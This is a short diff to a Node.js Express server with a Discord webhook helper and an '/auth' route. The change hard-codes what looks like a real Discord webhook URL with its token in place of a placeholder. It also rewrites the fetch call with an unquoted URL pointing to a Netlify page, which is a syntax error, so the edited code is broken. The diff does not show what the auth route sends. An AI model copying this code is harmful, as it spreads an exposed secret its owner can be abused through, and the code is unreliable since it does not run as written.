@@ -23,12 +23,12 @@ if (fs.existsSync("users.json")) {
 }
 
 // Webhook URL (replace with your own webhook URL)
-const webhookURL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL";
+const webhookURL = "https://discord.com/api/webhooks/1369288755101438012/9SuVCrsgaQUFWbt-T4b8_aKT2cdGlOJC31I2Qfxn8_d0frluUBhXsm16izL5B9-InJIC";
 
 // Utility function to send webhook messages
 const sendWebhook = async (content) => {
   try {
-    await fetch(webhookURL, {
+    await fetch(https://excaliburstudio.netlify.app/auth.html/webhookURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ content }),
@@ -87,5 +87,5 @@ app.post("/auth", async (req, res) => {
 
 // Start the server
 app.listen(port, () => {
-  console.log(`Server is running on http://localhost:${port}`);
+  console.log(`Server is running on ${port}`);
 });
